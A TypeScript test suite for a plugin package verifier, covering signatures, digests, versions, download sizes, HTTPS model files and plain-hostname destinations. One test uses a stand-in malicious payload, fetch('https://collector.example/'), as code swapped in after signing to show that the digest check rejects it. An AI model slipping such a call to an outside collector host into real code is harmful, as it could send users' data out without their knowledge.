import { test } from "node:test";
import assert from "node:assert/strict";
import { Operation } from "../gen/a4/v1/model_pb.js";
import {
  compareVersions,
  fingerprint,
  isPlainHostname,
  PackageError,
  type PackageProblem,
  packPackage,
  parseVersion,
  verifyPackage,
} from "./package.ts";
import { overlayCard, penCard, rawPackage, SAMPLE_CODE, testKey } from "./testing/packages.ts";

async function refused(bytes: Uint8Array | Promise<Uint8Array>, problem: PackageProblem, message?: RegExp) {
  await assert.rejects(verifyPackage(await bytes), (error: unknown) => {
    assert.ok(error instanceof PackageError, String(error));
    assert.equal(error.problem, problem, error.message);
    if (message) assert.match(error.message, message);
    return true;
  });
}

test("a packed plugin reads back: manifest, signature, and the code byte for byte", async () => {
  const key = testKey();
  const bytes = await packPackage({
    card: overlayCard(),
    publisherName: "Example Labs",
    publicKey: key.publicKey,
    code: SAMPLE_CODE,
    files: [],
    signedAt: new Date("2026-11-25T12:00:00Z"),
    sign: key.sign,
  });
  const pkg = await verifyPackage(bytes);
  assert.deepEqual(pkg.code, SAMPLE_CODE);
  assert.equal(pkg.card.id, "example.word-length");
  assert.equal(pkg.publisher.name, "Example Labs");
  assert.deepEqual(pkg.version, { major: 1, minor: 0, patch: 0 });
  assert.match(pkg.publisher.fingerprint, /^[0-9a-f]{4}( [0-9a-f]{4}){7}$/);
});

test("pack sets the download size from the files", async () => {
  const key = testKey();
  const data = new Uint8Array(1234).fill(7);
  const bytes = await packPackage({
    card: overlayCard({ downloadBytes: BigInt(1) }),
    publisherName: "Example Labs",
    publicKey: key.publicKey,
    code: SAMPLE_CODE,
    files: [{ url: "https://models.example.com/w.bin", data }],
    signedAt: new Date(),
    sign: key.sign,
  });
  const pkg = await verifyPackage(bytes);
  assert.equal(pkg.card.downloadBytes, BigInt(1234));
  assert.equal(pkg.manifest.files[0]?.size, BigInt(1234));
  assert.match(pkg.manifest.files[0]?.digest ?? "", /^urn:sha256:[0-9a-f]{64}$/);
});

test("a package over 16 MiB is refused before any part is read", async () => {
  await refused(new Uint8Array(17 * 1024 * 1024), "too-large", /larger than 16 MiB/);
});

test("a file that isn't a package is refused", async () => {
  await refused(new TextEncoder().encode("# Not a plugin\n"), "malformed");
});

test("one byte changed in the manifest fails the signature", async () => {
  const key = testKey();
  await refused(
    rawPackage({
      card: overlayCard(),
      key,
      tamperManifest: (m) => {
        const last = m.length - 1;
        m[last] = (m[last] ?? 0) ^ 0x01;
      },
    }),
    "signature",
    /signature doesn’t match/,
  );
});

test("a manifest naming key A but signed with key B fails", async () => {
  const a = testKey();
  const b = testKey();
  await refused(rawPackage({ card: overlayCard(), key: b, namedKey: a.publicKey }), "signature");
});

test("code swapped after signing fails its digest", async () => {
  const key = testKey();
  const other = new TextEncoder().encode("fetch('https://collector.example/');\n");
  await refused(rawPackage({ card: overlayCard(), key, storedCode: other }), "code-digest", /doesn’t match its digest/);
});

test("a version like 'latest' is refused", async () => {
  await refused(
    rawPackage({ card: overlayCard({ version: "latest" }), key: testKey() }),
    "version",
    /must look like 1\.2\.3/,
  );
});

test("download sizes that don't add up are refused", async () => {
  await refused(
    rawPackage({
      card: overlayCard({ downloadBytes: BigInt(4_000_000) }),
      key: testKey(),
      files: [
        { url: "https://models.example.com/m.onnx", size: BigInt(3_000_000), digest: `urn:sha256:${"a".repeat(64)}` },
      ],
    }),
    "files",
    /add up to 3,000,000 bytes, but the card declares 4,000,000/,
  );
});

test("model files must be HTTPS with a digest", async () => {
  await refused(
    rawPackage({
      card: overlayCard({ downloadBytes: BigInt(10) }),
      key: testKey(),
      files: [{ url: "http://models.example.com/m.onnx", size: BigInt(10), digest: `urn:sha256:${"a".repeat(64)}` }],
    }),
    "files",
    /HTTPS/,
  );
});

test("a wildcard destination is refused", async () => {
  const card = penCard({ placement: { case: "remote", value: { destinationHost: "*.example.com" } } });
  await refused(rawPackage({ card, key: testKey() }), "card", /must name one host/);
});

test("destinations are plain hostnames", () => {
  for (const ok of ["api.example.com", "a-b.example.co.uk"]) assert.equal(isPlainHostname(ok), true, ok);
  for (const bad of [
    "*.example.com",
    "https://api.example.com",
    "api.example.com:443",
    "api.example.com/v1",
    "127.0.0.1",
    "localhost",
    "API.example.com",
  ]) {
    assert.equal(isPlainHostname(bad), false, bad);
  }
});

test("an id with other characters is refused", async () => {
  await refused(
    rawPackage({ card: overlayCard({ id: "Example/Word Length" }), key: testKey() }),
    "card",
    /lowercase letters, digits, dots, and hyphens/,
  );
});

test("Generate is refused: installed plugins score and transform only", async () => {
  await refused(
    rawPackage({ card: overlayCard({ operations: [Operation.SCORE, Operation.GENERATE] }), key: testKey() }),
    "card",
    /score and transform only/,
  );
});

test("the host's own card checks apply: a remote card without a destination", async () => {
  await refused(
    rawPackage({ card: penCard({ placement: { case: "remote", value: { destinationHost: "" } } }), key: testKey() }),
    "card",
  );
});

test("the same key gives the same fingerprint under different names", async () => {
  const key = testKey();
  const a = await verifyPackage(await rawPackage({ card: overlayCard(), key, publisherName: "Example Labs" }));
  const b = await verifyPackage(await rawPackage({ card: overlayCard(), key, publisherName: "Someone Else" }));
  assert.equal(a.publisher.fingerprint, b.publisher.fingerprint);
  assert.equal(a.publisher.fingerprint, await fingerprint(key.publicKey));
  assert.notEqual(a.publisher.fingerprint, await fingerprint(testKey().publicKey));
});

test("versions parse and compare", () => {
  assert.deepEqual(parseVersion("1.2.3"), { major: 1, minor: 2, patch: 3 });
  for (const bad of ["1.2", "01.2.3", "1.2.3-beta", "v1.2.3", "latest"]) assert.equal(parseVersion(bad), null, bad);
  const v = (s: string) => parseVersion(s) ?? assert.fail(s);
  assert.ok(compareVersions(v("1.2.0"), v("1.1.9")) > 0);
  assert.ok(compareVersions(v("1.10.0"), v("1.9.0")) > 0);
  assert.equal(compareVersions(v("2.0.0"), v("2.0.0")), 0);
});

test("pack refuses a card A4 would refuse, and writes nothing", async () => {
  const key = testKey();
  await assert.rejects(
    packPackage({
      card: overlayCard({ operations: [Operation.GENERATE] }),
      publisherName: "Example Labs",
      publicKey: key.publicKey,
      code: SAMPLE_CODE,
      files: [],
      signedAt: new Date(),
      sign: key.sign,
    }),
    (e: unknown) => e instanceof PackageError && e.problem === "card",
  );
});
